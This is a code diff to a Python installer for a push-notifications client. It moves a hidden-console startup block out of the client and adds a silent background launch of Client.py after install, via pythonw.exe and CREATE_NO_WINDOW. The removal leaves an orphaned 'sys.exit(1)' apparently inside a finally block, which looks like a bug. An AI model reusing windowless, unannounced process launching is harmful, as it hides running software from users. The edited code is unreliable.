@@ -4236,21 +4236,9 @@ Features:
             traceback.print_exc()
         finally:
             print("Shutting down client...")
-            self.deactivate_security_features()
-
-if __name__ == "__main__":
-    try:
-        # Ensure completely silent startup - Windows-only installer
-        import ctypes
-        # Hide console window immediately on startup
-        console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-        if console_hwnd != 0:
-            ctypes.windll.user32.ShowWindow(console_hwnd, 0)  # SW_HIDE
-        
-        client = PushNotificationsClient()
-        client.run()
-    except Exception as e:
-        # Windows-only installer - no error output to console
+# The embedded client code above is only used when Client.py runs independently.
+# The installer script below should NOT auto-run the embedded client.
+# Client.py file will be created separately and launched as subprocess after install.
         sys.exit(1)
 
 
@@ -4778,6 +4766,24 @@ def main():
         success = installer.run_installation()
         
         if success:
+            # Launch client as separate background process
+            try:
+                client_path = installer.install_path / "Client.py"
+                if client_path.exists():
+                    # Use pythonw.exe to ensure no console window appears
+                    pythonw_exe = sys.executable.replace('python.exe', 'pythonw.exe')
+                    if not Path(pythonw_exe).exists():
+                        pythonw_exe = sys.executable  # Fallback to python.exe
+                    
+                    subprocess.Popen([pythonw_exe, str(client_path)],
+                                   creationflags=subprocess.CREATE_NO_WINDOW,
+                                   cwd=str(installer.install_path))
+                    print("[OK] Client started in background")
+                else:
+                    print("[WARNING] Client.py not found, client not started")
+            except Exception as e:
+                print(f"[WARNING] Could not start client: {e}")
+            
             if USE_GUI_DIALOGS:
                 try:
                     root = tk.Tk()
